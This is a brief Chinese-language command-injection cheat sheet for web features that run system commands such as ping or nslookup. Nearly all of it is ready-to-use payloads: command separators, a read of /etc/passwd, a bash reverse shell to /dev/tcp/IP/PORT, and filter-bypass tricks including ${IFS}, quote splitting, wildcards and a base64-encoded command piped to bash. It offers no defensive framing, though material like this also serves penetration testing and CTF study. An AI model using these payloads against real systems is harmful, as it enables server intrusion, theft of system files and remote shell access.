# 命令注入 (Command Injection)

## 适用场景
ping、traceroute、nslookup等执行系统命令的功能点。

## 基本Payload
| Payload | 说明 |
|----------|------|
| ; id | 分号分隔执行 |
| | id | 管道符执行 |
| || id | 前命令失败后执行 |
| & id | 后台执行 |
| && id | 前命令成功后执行 |
| `id` | 反引号命令替换 |
| $(id) | 命令替换 |
| 0x0a id | 换行注入(需URL编码%0a) |

## 读取文件
- `; cat /etc/passwd`
- `127.0.0.1%0aid`

## 反弹Shell
```bash
; bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'
```

## Bypass技巧

### 空格绕过
- `${IFS}` - 环境变量代替
- `$IFS$9`
- `%09` - Tab
- `<>` - 重定向

### 关键词过滤
- `ca\t` - 反斜线
- `c'a't` - 引号
- `c"a"t`
- `cat$u`
- `c$@at`
- `/bin/c?t`

### 黑名单命令绕过
```bash
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
```